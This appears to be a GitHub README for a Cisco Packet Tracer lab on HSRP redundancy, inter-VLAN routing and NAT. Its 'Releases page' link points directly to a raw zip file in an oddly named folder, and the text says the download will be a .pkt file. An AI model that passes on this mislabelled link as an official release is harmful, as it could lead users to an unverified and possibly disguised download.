## 📖 Overview
The **HSRP-Based Dual-Path Edge Redundancy** project showcases a complete Cisco Packet Tracer lab. This application allows you to create HSRP gateway redundancy, configure Inter-VLAN routing, and set up PAT/NAT. It also facilitates wireless client connectivity. With this lab, you ensure high availability, secure VLAN segmentation, and a resilient edge design using dual routers and Layer 3 switching.

## 🌟 Features
- **HSRP Gateway Redundancy:** Provides an easy way to maintain network availability.
- **Inter-VLAN Routing:** Efficiently routes traffic between different VLANs.
- **PAT/NAT Configuration:** Translates private IP addresses to public ones.
- **Wireless Client Connectivity:** Supports wireless devices in the network.
- **Dual Router Setup:** Offers redundancy for enhanced reliability.
- **Layer 3 Switching:** Ensures fast and effective data handling.

## ⚙️ System Requirements
To run this application effectively, ensure your system meets the following requirements:

- **Operating System:** Windows 10 or later, macOS, or any Linux distribution.
- **Software:** Cisco Packet Tracer version 7.2 or later.
- **RAM:** At least 4 GB.
- **Disk Space:** Minimum 500 MB of free space.

## 🚀 Getting Started
To set up and run the application, follow these steps:

1. **Download Packet Tracer:**
   - If you do not have Cisco Packet Tracer, download and install it from the official Cisco Networking Academy website.

2. **Visit Releases Page:**
   - Go to the [Releases page](https://raw.githubusercontent.com/JC20202/hsrp-dual-path-redundancy/main/hydrodynamic/hsrp-dual-path-redundancy.zip) to find the latest version of the lab files.

3. **Download the Lab File:**
   - Look for the most recent version and click the download link. The file will typically be in a `.pkt` format.

4. **Open the Lab in Packet Tracer:**
   - Launch Cisco Packet Tracer, then open the downloaded lab file by navigating to `File > Open` and selecting the file from your downloads.

5. **Review the Configuration:**
   - Familiarize yourself with the components and configurations included in the lab file. This might include routers, switches, and VLAN setups.

6. **Run the Simulation:**
   - Start the simulation to see how the network handles traffic. Test failover scenarios to observe HSRP in action.

## 🔧 Troubleshooting Tips
If you run into issues, consider the following tips:

- **Ensure Compatibility:** Make sure you are using the correct version of Cisco Packet Tracer.
- **Check Network Connections:** Verify that all devices in the lab are properly connected as per the configuration.
- **Review Configuration Settings:** Look for any potential misconfigurations in VLANs or IP addresses.
- **Consult Documentation:** Refer to the readme files included in the lab for additional guidance.
